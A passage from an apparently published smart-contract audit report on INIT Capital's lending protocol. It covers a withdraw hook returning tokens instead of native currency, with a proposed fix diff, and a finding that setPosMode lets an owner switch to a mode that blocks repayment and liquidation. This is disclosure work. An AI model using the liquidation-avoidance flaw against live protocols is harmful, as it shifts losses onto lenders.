class=\"mtk12\">sender</span><span class=\"mtk1\">).</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">}(</span><span class=\"mtk8\">&#39;&#39;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">_require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">success</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span class=\"mtk12\">CALL_FAILED</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>This could disrupt user expectations. Consider a third-party contract integrated with this hook that can only operate using native balance, doesn’t expect, and cannot handle tokens/ERC20. This can cause issues for the integrator.</p>\n<h3 id=\"recommended-mitigation-steps-5\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-5\" aria-label=\"recommended mitigation steps 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>When constructing withdraw operation, check if <code>_params.returnNative</code> is set to true, and change <code>uTokenReceiver</code> to <code>address(this</code>.</p>\n<details>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"11\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    function _handleWithdraw(uint _offset, bytes[] memory _data, uint _initPosId, WithdrawParams[] calldata _params)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    function _handleWithdraw(uint _offset, bytes[] memory _data, uint _initPosId, WithdrawParams[] calldata _params, bool _returnNative)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        internal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        view</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        returns (uint, bytes[] memory)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        for (uint i; i &lt; _params.length; i = i.uinc()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            // decollateralize to pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            _data[_offset] = abi.encodeWithSelector(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                IInitCore.decollateralize.selector, _initPosId, _params[i].pool, _params[i].shares, _params[i].pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            _offset = _offset.uinc();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            // burn collateral to underlying token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            address helper = _params[i].rebaseHelperParams.helper;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            address uTokenReceiver = _params[i].to;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            // if need to unwrap to rebase token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            if (helper != address(0)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                address uToken = ILendingPool(_params[i].pool).underlyingToken();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                _require(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    _params[i].rebaseHelperParams.tokenIn == uToken</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                        &amp;&amp; IRebaseHelper(_params[i].rebaseHelperParams.helper).YIELD_BEARING_TOKEN() == uToken,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    Errors.INVALID_TOKEN_IN</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                uTokenReceiver = helper;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if (_returnNative &amp;&amp; uToken == WNATIVE) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                uTokenReceiver = address(this);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            _data[_offset] = abi.encodeWithSelector(IInitCore.burnTo.selector, _params[i].pool, uTokenReceiver);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            _offset = _offset.uinc();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        return (_offset, _data);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"12\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    function _handleMulticall(uint _initPosId, OperationParams calldata _params)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        internal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        returns (bytes[] memory results)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        // prepare data for multicall</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        // 1. repay (if needed)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        // 2. withdraw (if needed)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        // 3. change position mode (if needed)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        // 4. borrow (if needed)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        // 5. deposit (if needed)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        bool changeMode = _params.mode != 0 &amp;&amp; _params.mode != IPosManager(POS_MANAGER).getPosMode(_initPosId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        bytes[] memory data;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            uint dataLength = _params.repayParams.length + (2 * _params.withdrawParams.length) + (changeMode ? 1 : 0)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                + _params.borrowParams.length + (2 * _params.depositParams.length);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            data = new bytes[](dataLength);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint offset;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        // 1. repay</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (offset, data) = _handleRepay(offset, data, _initPosId, _params.repayParams);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        // 2. withdraw</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        (offset, data) = _handleWithdraw(offset, data, _initPosId, _params.withdrawParams);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        (offset, data) = _handleWithdraw(offset, data, _initPosId, _params.withdrawParams, _params.returnNative);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        // 3. change position mode</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        if (changeMode) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            data[offset] = abi.encodeWithSelector(IInitCore.setPosMode.selector, _initPosId, _params.mode);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            offset = offset.uinc();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        // 4. borrow</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (offset, data) = _handleBorrow(offset, data, _initPosId, _params.borrowParams);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        // 5. deposit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (offset, data) = _handleDeposit(offset, data, _initPosId, _params.depositParams);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        // execute multicall</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        results = IMulticall(CORE).multicall(data);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n</details>\n<p><strong><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/29#issuecomment-1870324594\">fez-init (INIT) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-04-setposmode-should-not-allow-changing-the-mode-when-the-new-modes-canrepay-status-is-disabled\" style=\"position:relative;\"><a href=\"#m-04-setposmode-should-not-allow-changing-the-mode-when-the-new-modes-canrepay-status-is-disabled\" aria-label=\"m 04 setposmode should not allow changing the mode when the new modes canrepay status is disabled permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/26\">[M-04] <code>setPosMode</code> should not allow changing the mode when the new mode’s <code>canRepay</code> status is disabled</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/26\">said</a></em></p>\n<p>In the scenario where the mode’s <code>canRepay</code> status is set to false, positions using that mode cannot be repaid and liquidated. However, users are allowed to change their position’s mode to one where the <code>canRepay</code> status is currently set to false. This could be exploited when a position owner observes that their position’s health is approaching the liquidation threshold, allowing them to prevent liquidation.</p>\n<h3 id=\"proof-of-concept-6\" style=\"position:relative;\"><a href=\"#proof-of-concept-6\" aria-label=\"proof of concept 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>It can be observed that when <code>setPosMode</code> is called, it checks that <code>newModeStatus.canBorrow</code> and <code>currentModeStatus.canRepay</code> is set to true. However, it doesn’t check the status of <code>newModeStatus.canRepay</code> flag.</p>\n<p><a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L203-L204\">https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L203-L204</a></p>\n<details>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"13\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setPosMode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint16</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_mode</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">public</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">virtual</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">onlyAuthorized</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">ensurePositionHealth</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">nonReentrant</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">IConfig</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_config</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IConfig</span><span class=\"mtk1\">(</span><span class=\"mtk12\">config</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// get current collaterals in the position</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pools</span><span class=\"mtk1\">,, </span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wLps</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\">[][] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ids</span><span class=\"mtk1\">,) =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">IPosManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">POS_MANAGER</span><span class=\"mtk1\">).</span><span class=\"mtk11\">getPosCollInfo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint16</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currentMode</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getPosMode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ModeStatus</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currentModeStatus</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_config</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getModeStatus</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currentMode</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ModeStatus</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newModeStatus</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_config</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getModeStatus</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_mode</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">pools</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">wLps</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">_require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newModeStatus</span><span class=\"mtk1\">.</span><span class=\"mtk12\">canCollateralize</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span class=\"mtk12\">COLLATERALIZE_PAUSED</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">_require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currentModeStatus</span><span class=\"mtk1\">.</span><span class=\"mtk12\">canDecollateralize</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span class=\"mtk12\">DECOLLATERALIZE_PAUSED</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check that each position collateral belongs to the _mode</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">pools</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">i</span><span class=\"mtk1\">.</span><span class=\"mtk11\">uinc</span><span class=\"mtk1\">()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">_require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_config</span><span class=\"mtk1\">.</span><span class=\"mtk11\">isAllowedForCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_mode</span><span class=\"mtk1\">, </span><span class=\"mtk12\">pools</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]), </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span class=\"mtk12\">INVALID_MODE</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">wLps</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">i</span><span class=\"mtk1\">.</span><span class=\"mtk11\">uinc</span><span class=\"mtk1\">()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">j</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">ids</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">j</span><span class=\"mtk1\">.</span><span class=\"mtk11\">uinc</span><span class=\"mtk1\">()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">_require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_config</span><span class=\"mtk1\">.</span><span class=\"mtk11\">isAllowedForCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_mode</span><span class=\"mtk1\">, </span><span class=\"mtk11\">IBaseWrapLp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wLps</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]).</span><span class=\"mtk11\">lp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ids</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">][</span><span class=\"mtk12\">j</span><span class=\"mtk1\">])), </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span class=\"mtk12\">INVALID_MODE</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// get current debts in the position</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">pools</span><span class=\"mtk1\">, </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">IPosManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">POS_MANAGER</span><span class=\"mtk1\">).</span><span class=\"mtk11\">getPosBorrInfo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">IRiskManager</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_riskManager</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IRiskManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">riskManager</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check that each position debt belongs to the _mode</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">pools</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">i</span><span class=\"mtk1\">.</span><span class=\"mtk11\">uinc</span><span class=\"mtk1\">()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">_require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_config</span><span class=\"mtk1\">.</span><span class=\"mtk11\">isAllowedForBorrow</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_mode</span><span class=\"mtk1\">, </span><span class=\"mtk12\">pools</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]), </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span class=\"mtk12\">INVALID_MODE</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">_require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newModeStatus</span><span class=\"mtk1\">.</span><span class=\"mtk12\">canBorrow</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span class=\"mtk12\">BORROW_PAUSED</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">_require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currentModeStatus</span><span class=\"mtk1\">.</span><span class=\"mtk12\">canRepay</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span class=\"mtk12\">REPAY_PAUSED</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// update debt on current mode</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_riskManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">updateModeDebtShares</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currentMode</span><span class=\"mtk1\">, </span><span class=\"mtk12\">pools</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">], -</span><span class=\"mtk12\">shares</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">toInt256</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// update debt on new mode</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_riskManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">updateModeDebtShares</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_mode</span><span class=\"mtk1\">, </span><span class=\"mtk12\">pools</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">], </span><span 